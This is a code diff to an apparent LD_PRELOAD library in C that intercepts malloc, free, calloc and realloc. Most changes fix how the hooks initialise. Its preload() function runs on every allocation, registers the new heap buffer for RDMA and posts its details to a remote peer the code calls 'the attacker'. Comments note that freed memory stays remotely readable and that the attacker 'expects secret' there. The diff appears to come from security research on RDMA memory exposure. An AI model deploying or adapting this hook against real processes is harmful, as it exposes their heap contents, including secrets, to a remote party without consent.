@@ -9,6 +9,8 @@
 
 static __thread int no_hook;
 
+static unsigned char buffer[8192];
+
 void preload(void *);
 
 static void *(*real_malloc)(size_t) = NULL;
@@ -26,6 +28,8 @@ static void __attribute__((constructor))init(void) {
 void *malloc(size_t len) {
   void* ret;
 
+  if (!real_malloc) init();
+
   if (no_hook) {
     return (*real_malloc)(len);
   }
@@ -33,24 +37,29 @@ void *malloc(size_t len) {
   no_hook = 1;
   printf("malloc call: %zu bytes\n", len);
   ret = (*real_malloc)(len); 
-  
-  /* preload attack */
-  preload(ret); 
-  
+  preload(ret);
   no_hook = 0; 
   return ret; 
 }
 
 void free(void *ptr) {
+  if (!real_free) init();
+  if (!ptr) return;
   (*real_free)(ptr);
 }
 
 void *calloc(size_t nmem, size_t size) {
-  return real_calloc(nmem, size); 
+  if (real_calloc == NULL)
+    return buffer;
+  
+  init();
+
+  return (*real_calloc)(nmem, size); 
 }
 
 void *realloc(void *ptr, size_t size) {
-  return real_realloc(ptr, size);
+  if (!real_realloc) init();
+  return (*real_realloc)(ptr, size);
 }
 
 void preload(void *ptr){
@@ -86,6 +95,8 @@ void preload(void *ptr){
   ret = rdma_create_qp(id, pd, &attr);
   ret = rdma_connect(id, &conn_param);
   pd = id->qp->pd;
+  //char* ptr = (char*)malloc(128);
+  
   
   // change to true to use implicit ODP.
   bool useodp = false;
@@ -115,5 +126,7 @@ void preload(void *ptr){
       int ret = ibv_post_send(id->qp, &wr, &bad);
       assert(ret==0 && "Failed to send memory information to the attacker");
   }
+//  printf("Attacker expects secret at %p \n",ptr);
 
+  //free(ptr); // free memory, but it is still RDMA accesible
 }
